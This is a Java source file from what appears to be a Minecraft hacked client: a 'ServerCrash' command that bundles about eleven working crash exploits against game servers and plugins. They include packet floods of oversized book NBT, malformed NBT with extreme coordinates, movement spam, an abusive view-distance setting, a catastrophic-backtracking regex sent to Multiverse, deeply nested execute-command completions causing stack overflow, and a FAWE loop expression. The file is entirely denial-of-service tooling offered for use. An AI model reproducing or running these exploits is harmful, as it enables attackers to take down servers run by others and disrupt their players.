/*
 * Copyright (c) Shadow client, 0x150, Saturn5VFive 2022. All rights reserved.
 */

package net.shadow.client.feature.command.impl;

import net.shadow.client.ShadowMain;
import net.shadow.client.feature.command.Command;
import net.shadow.client.feature.command.exception.CommandException;
import net.minecraft.client.MinecraftClient;
import net.minecraft.entity.Entity;
import net.minecraft.entity.Entity.RemovalReason;
import net.minecraft.network.packet.c2s.play.VehicleMoveC2SPacket;
import net.minecraft.util.math.Vec3d;
import net.shadow.client.feature.gui.notifications.Notification;
import io.netty.buffer.Unpooled;
import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import net.minecraft.client.option.ChatVisibility;
import net.minecraft.item.Item;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.nbt.*;
import net.minecraft.network.PacketByteBuf;
import net.minecraft.network.packet.c2s.play.*;
import net.minecraft.network.packet.s2c.play.GameMessageS2CPacket;
import net.minecraft.screen.slot.SlotActionType;
import net.minecraft.util.Arm;
import net.minecraft.util.Hand;
import net.minecraft.util.Identifier;
import net.minecraft.util.hit.BlockHitResult;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Direction;
import net.minecraft.util.math.Vec3d;
import net.minecraft.util.registry.Registry;

import java.util.Objects;
import java.util.Random;

public class ServerCrash extends Command {

    final MinecraftClient client = MinecraftClient.getInstance();

    public ServerCrash() {
        super("ServerCrash", "Crash the server using various methods", "ServerCrash", "servercrash", "Servercrash", "scrash", "qcrash");
    }

    @Override
    public String[] getSuggestions(String fullCommand, String[] args) {
        if (args.length == 1) {
            return new String[]{"rider", "book", "malformednbt", "move", "papertest", "chunkoob", "mvcrash", "stackoverflow", "playtime", "maptool", "fawe"};
        }
        if(args.length == 2){
            return new String[]{"(power)"};
        }
        return super.getSuggestions(fullCommand, args);
    }

    @Override
    public void onExecute(String[] args) throws CommandException {
        switch(args[0].toLowerCase()){
            case "rider" -> {
                Entity ridingEntity = client.player.getVehicle();
                if (ridingEntity == null) {
                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "You must ride a entity! (bruh)");
                }
                client.world.removeEntity(ridingEntity.getId(), RemovalReason.CHANGED_DIMENSION);
                Vec3d forward = Vec3d.fromPolar(0, client.player.getYaw()).normalize().multiply(90000.0F);
                ridingEntity.updatePosition(client.player.getX() + forward.x, client.player.getY(), client.player.getZ() + forward.z);
                client.player.networkHandler.sendPacket(new VehicleMoveC2SPacket(ridingEntity));
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Riding Crash Exploit");
            }

            case "book" -> {
                for(int real = 0; real < 50; real++){
                    for (int j = 0; j < 49; j++) {
                        ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
                        NbtCompound tag = new NbtCompound();
                        NbtList list = new NbtList();
                        for (int i = 0; i < 300; i++) {
                            list.add(NbtString.of("::::::::::".repeat(250)));
                        }
                        tag.put("author", NbtString.of(rndStr(2000)));
                        tag.put("title", NbtString.of(rndStr(2000)));
                        tag.put("pages", list);
                        crash.setNbt(tag);
                        if (j == 36 + client.player.getInventory().selectedSlot) {
                            client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(5 + j, new ItemStack(Items.AIR, 1)));
                            return;
                        }
                        client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(j, crash));
                    }
                }
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Book Crash");
            }

            case "malformednbt" -> {
                ItemStack ez = new ItemStack(Items.CHEST, 1);
                NbtCompound nbt = new NbtCompound();
                nbt.put("x", NbtDouble.of(Double.MAX_VALUE));
                nbt.put("y", NbtDouble.of(0.0d));
                nbt.put("z", NbtDouble.of(Double.MAX_VALUE));
                NbtCompound fuck = new NbtCompound();
                fuck.put("BlockEntityTag", nbt);
                ez.setNbt(fuck);
                client.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(25, ez));
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Malformed NBT Crash");
            }

            case "move" -> {
                int size;
                try {
                    size = Integer.parseInt(args[1]);
                } catch (Exception e) {
                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please provide a power (around 5000 is good)");
                    return;
                }
                for (int i = 0; i < 250; i++) {
                    client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX() + (i * size), client.player.getY(), client.player.getZ() + (i * size), true));
                }
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Movement Crash");
            }

            case "papertest" -> {
                int peenus;
                try {
                    peenus = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 500 is good)");
                    break;
                }
                client.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", peenus, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent View Distance Crash");
            }

            case "chunkoob" -> {
                client.player.networkHandler.sendPacket(new PlayerInteractBlockC2SPacket(Hand.MAIN_HAND, new BlockHitResult(new Vec3d(0.5, 0.5, 0.5), Direction.UP, new BlockPos(Double.POSITIVE_INFINITY, 69, Double.POSITIVE_INFINITY), true)));
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent ChunkOOB Crash");
            }

            case "mvcrash" -> {
                client.player.sendChatMessage("/mv ^(.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*.*." + "*.".repeat(new Random().nextInt(6)) + "++)$^");
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Multiverse Crash");
            }

            case "stackoverflow" -> {
                int varvarvar2;
                try {
                    varvarvar2 = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 1600 is good)");
                    break;
                }
                String popper2 = "/execute as @e" + " as @e".repeat(varvarvar2);
                client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, popper2));
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Stackoverflow Crash");
            }

            case "playtime" -> {
                for (int i = 0; i < 10; i++) {
                    client.player.sendChatMessage("/playtime %¤#\"%¤#\"%¤#\"%¤#");
                }
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Playtime Crash");
            }
            
            case "maptool" -> {
                int var24 = 4;
                try {
                    var24 = Integer.parseInt(args[1]);
                } catch (NumberFormatException e) {
                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 100 is good)");
                }
                client.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + var24 + " " + var24 + "");
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Maptool Crash");
            }

            case "fawe" -> {
                client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(new Random().nextInt(100), "/to for(i=0;i<256;i++){for(j=0;j<256;j++){for(k=0;k<256;k++){for(l=0;l<256;l++){ln(pi)}}}}"));
                Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent FAWE Crash");
            }
        }
    }

    private String rndStr(int size) {
        StringBuilder buf = new StringBuilder();
        String[] chars = new String[]{"a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};
        Random r = new Random();
        for (int i = 0; i < size; i++) {
            buf.append(chars[r.nextInt(chars.length)]);
        }
        return buf.toString();
    }
}